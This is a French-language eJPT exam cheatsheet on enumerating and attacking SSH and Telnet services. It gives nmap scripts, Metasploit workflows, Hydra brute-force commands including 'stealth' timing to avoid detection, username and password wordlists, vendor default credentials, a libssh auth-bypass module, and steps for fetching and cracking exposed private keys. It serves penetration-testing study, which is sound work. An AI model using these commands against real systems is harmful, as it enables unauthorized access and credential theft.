# 🔐 SSH & Telnet Enumeration - Cheatsheet eJPT

## 🚀 1. SSH (Port 22) - Énumération & Exploitation

### Scripts Nmap pour SSH
| Script | Description | Usage |
|--------|-------------|-------|
| `ssh-hostkey` | Clés d'hôte SSH | `nmap --script ssh-hostkey target` |
| `ssh-auth-methods` | Méthodes d'authentification | `nmap --script ssh-auth-methods target` |
| `ssh2-enum-algos` | Algorithmes supportés | `nmap --script ssh2-enum-algos target` |
| `ssh-brute` | Brute force SSH | `nmap --script ssh-brute target` |
| `ssh-publickey-acceptance` | Test clés publiques | `nmap --script ssh-publickey-acceptance target` |
| `ssh-run` | Exécution de commandes | `nmap --script ssh-run --script-args ssh-run.cmd=id target` |

### Commandes Nmap SSH essentielles
```bash
# Énumération complète SSH
nmap -p22 --script ssh-* target

# Énumération de base
nmap -p22 -sV --script ssh-hostkey,ssh-auth-methods target

# Test d'algorithmes (détection version)
nmap -p22 --script ssh2-enum-algos target

# Banner grabbing SSH
nc target 22
```

### Modules Metasploit SSH
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/ssh/ssh_version` | Version SSH | `use auxiliary/scanner/ssh/ssh_version` |
| `auxiliary/scanner/ssh/ssh_login` | Brute force SSH | `use auxiliary/scanner/ssh/ssh_login` |
| `auxiliary/scanner/ssh/ssh_enumusers` | Énumération utilisateurs | `use auxiliary/scanner/ssh/ssh_enumusers` |
| `auxiliary/scanner/ssh/ssh_identify_pubkeys` | Identification clés publiques | `use auxiliary/scanner/ssh/ssh_identify_pubkeys` |
| `auxiliary/scanner/ssh/libssh_auth_bypass` | CVE-2018-10933 bypass | `use auxiliary/scanner/ssh/libssh_auth_bypass` |

### Workflow Metasploit SSH
```bash
# 1. Détection version SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS target
run

# 2. Énumération utilisateurs (si possible)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run

# 3. Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
set VERBOSE true
run
```

### Brute Force SSH avec Hydra
```bash
# Brute force utilisateur unique
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target

# Brute force liste d'utilisateurs
hydra -L users.txt -P passwords.txt -t 4 -f ssh://target

# Options recommandées SSH
hydra -L users.txt -P passwords.txt -t 4 -f -V -o ssh_results.txt ssh://target

# Avec délai (mode furtif)
hydra -l root -P passwords.txt -t 1 -w 3 -f ssh://target
```

**⚠️ Limitation SSH :** Maximum 4-6 threads recommandés pour éviter la détection/blocage.

### Wordlists SSH spécialisées
```bash
# Utilisateurs Linux/Unix courants
cat > ssh_users.txt << EOF
root
admin
administrator
user
test
guest
demo
service
operator
backup
support
oracle
postgres
mysql
www-data
ubuntu
centos
debian
EOF

# Mots de passe SSH/Linux courants
cat > ssh_passwords.txt << EOF
root
admin
password
123456
password123
toor
qwerty
welcome
letmein
changeme
default
test
guest
demo
service
EOF
```

### Connexions SSH après brute force
```bash
# Connexion standard
ssh user@target

# Avec port personnalisé
ssh user@target -p 2222

# Avec clé privée
ssh -i private_key user@target

# Commande unique
ssh user@target "command"

# Tunnel SSH (port forwarding)
ssh -L 8080:localhost:80 user@target
```

### Vulnérabilités SSH communes
| CVE | Description | Test |
|-----|-------------|------|
| **CVE-2018-10933** | libssh auth bypass | `use auxiliary/scanner/ssh/libssh_auth_bypass` |
| **CVE-2016-6210** | User enumeration | Timing attack sur auth |
| **CVE-2008-0166** | Weak keys Debian | Clés prévisibles |

---

## 📟 2. Telnet (Port 23) - Énumération & Exploitation

### Scripts Nmap pour Telnet
| Script | Description | Usage |
|--------|-------------|-------|
| `telnet-brute` | Brute force Telnet | `nmap --script telnet-brute target` |
| `telnet-encryption` | Test chiffrement | `nmap --script telnet-encryption target` |
| `telnet-ntlm-info` | Info NTLM via Telnet | `nmap --script telnet-ntlm-info target` |

### Commandes Nmap Telnet
```bash
# Énumération Telnet
nmap -p23 -sV --script telnet-* target

# Banner grabbing Telnet
telnet target 23
nc target 23

# Test de connexion
echo "" | telnet target 23
```

### Modules Metasploit Telnet
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/telnet/telnet_version` | Version Telnet | `use auxiliary/scanner/telnet/telnet_version` |
| `auxiliary/scanner/telnet/telnet_login` | Brute force Telnet | `use auxiliary/scanner/telnet/telnet_login` |
| `auxiliary/scanner/telnet/telnet_encrypt_overflow` | Buffer overflow | `use auxiliary/scanner/telnet/telnet_encrypt_overflow` |

### Workflow Metasploit Telnet
```bash
# 1. Détection version
use auxiliary/scanner/telnet/telnet_version
set RHOSTS target
run

# 2. Brute force Telnet
use auxiliary/scanner/telnet/telnet_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Brute Force Telnet avec Hydra
```bash
# Brute force basique
hydra -l admin -P passwords.txt telnet://target

# Brute force avec listes
hydra -L users.txt -P passwords.txt -t 16 -f telnet://target

# Credentials courants Telnet
hydra -L <(echo -e "admin\nroot\nadministrator") \
      -P <(echo -e "admin\npassword\n123456\ntelnet") \
      -t 8 -f telnet://target
```

### Connexion Telnet manuelle
```bash
# Connexion standard
telnet target 23

# Test de credentials courants
telnet target
# Tester: admin/admin, root/root, admin/password

# Avec timeout
timeout 10 telnet target 23
```

### Credentials Telnet par défaut courants
| Équipement | Username | Password |
|------------|----------|----------|
| **Cisco** | admin | admin |
| **Cisco** | cisco | cisco |
| **3Com** | admin | admin |
| **Netgear** | admin | password |
| **Linksys** | admin | admin |
| **D-Link** | admin | (vide) |
| **Generic** | root | root |
| **Generic** | admin | 123456 |

---

## 🔧 3. Outils complémentaires SSH/Telnet

### ssh-audit (Audit sécurité SSH)
```bash
# Installation
pip install ssh-audit

# Audit complet SSH
ssh-audit target
ssh-audit target:2222    # Port personnalisé

# Format JSON
ssh-audit -j target > ssh_audit.json
```

### Enum4linux pour SSH (si disponible)
```bash
# Parfois SSH expose des infos via LDAP/SMB
enum4linux target | grep -i ssh
```

### Autres outils SSH
```bash
# ssh-keyscan (clés publiques)
ssh-keyscan target
ssh-keyscan -p 2222 target

# sshpass (automation passwords)
sshpass -p 'password' ssh user@target

# SSH avec ProxyCommand
ssh -o ProxyCommand="nc -X connect -x proxy:8080 %h %p" user@target
```

---

## 🎯 4. Cas d'usage spécifiques eJPT

### Scénario 1: SSH avec credentials faibles
```bash
# 1. Découverte SSH
nmap -p22 -sV target

# 2. Test credentials courants AVANT brute force
ssh root@target     # password: root, toor, password
ssh admin@target    # password: admin, password, 123456

# 3. Si échec, brute force prudent
hydra -l root -P common_passwords.txt -t 4 -f ssh://target

# 4. Connexion et énumération
ssh root@target
uname -a && id && sudo -l
```

### Scénario 2: Telnet sur équipement réseau
```bash
# 1. Découverte Telnet
nmap -p23 target

# 2. Test credentials par défaut équipement réseau
telnet target
# Tester: admin/admin, cisco/cisco, admin/password

# 3. Si succès → Énumération équipement
show version
show config
show users
```

### Scénario 3: SSH avec clés privées exposées
```bash
# 1. Recherche de clés privées dans web/FTP
find / -name "*_rsa" -o -name "id_*" 2>/dev/null
wget http://target/backup/id_rsa

# 2. Connexion avec clé
chmod 600 id_rsa
ssh -i id_rsa user@target

# 3. Si clé protégée par passphrase
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

---

## 💡 5. Conseils et astuces eJPT

### Workflow SSH/Telnet recommandé
1. **Découverte** : `nmap -p22,23 -sV target`
2. **Banner analysis** : Identifier version/OS
3. **Test credentials courants** : root:root, admin:admin
4. **Brute force prudent** : Hydra avec limitations
5. **Post-compromise** : Énumération locale

### Points critiques SSH/Telnet eJPT
- **SSH root login** souvent autorisé dans labs
- **Credentials faibles** très fréquents (root:password)
- **Telnet = plaintext** → Facile à exploiter
- **Port SSH non-standard** (2222, 2200) à vérifier
- **Clés SSH** parfois exposées dans web/FTP

### Erreurs courantes à éviter
- **Trop de threads** SSH → Détection/blocage
- **Brute force sans test manual** → Perte de temps
- **Ignorer versions SSH anciennes** → Vulnérabilités
- **Ne pas tester Telnet** si port 23 ouvert
- **Oublier ports SSH alternatifs**

### One-liners SSH/Telnet
```bash
# Test SSH credentials courants
for pass in password root admin 123456; do sshpass -p $pass ssh -o ConnectTimeout=5 root@target && break; done

# Scan SSH/Telnet multi-ports
nmap -p22,23,2222,2200 -sV target

# Test Telnet rapide
echo -e "admin\nadmin\n" | timeout 10 telnet target
```

### Timing et stealth SSH
```bash
# Mode furtif SSH (éviter détection)
hydra -l root -P passwords.txt -t 1 -w 5 ssh://target

# Mode normal
hydra -l root -P passwords.txt -t 4 ssh://target

# Mode rapide (attention logs)
hydra -l root -P passwords.txt -t 8 ssh://target
```

**🎯 Conseil final eJPT :** SSH/Telnet dans l'eJPT suivent souvent ce pattern : découverte → test credentials courants (root:password, admin:admin) → brute force si échec. Telnet = jackpot car pas de chiffrement. SSH root souvent autorisé dans les labs contrairement à la vraie vie !